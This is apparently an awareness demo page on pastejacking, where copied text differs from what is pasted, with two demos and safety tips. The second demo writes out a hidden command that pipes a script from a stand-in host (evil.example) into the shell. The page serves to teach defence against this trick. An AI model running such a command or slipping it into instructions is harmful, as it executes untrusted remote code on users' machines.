Pastejacking

What you copy is not always what you paste. Try it yourself: this is a safe demo, and nothing runs.

Demo 1 · The hijacked copy button

A "tutorial" website tells you to install a Python package. Copy the command (with the button, or select it and press Ctrl+C):

pip install requests

Demo 2 · The invisible text

Select the whole line below with your mouse and copy it (Ctrl+C):

git clone https://github.com/Kanak234/demo && curl -s http://evil.example/steal.sh | sh # && cd demo

Now paste here (Ctrl+V) 👇

How to stay safe

  • Never paste straight into a terminal. Paste into Notepad first and read it.
  • Type short commands yourself instead of copying them.
  • Modern terminals warn about multi-line pastes. Keep that warning turned on.
  • Copy commands only from official documentation.
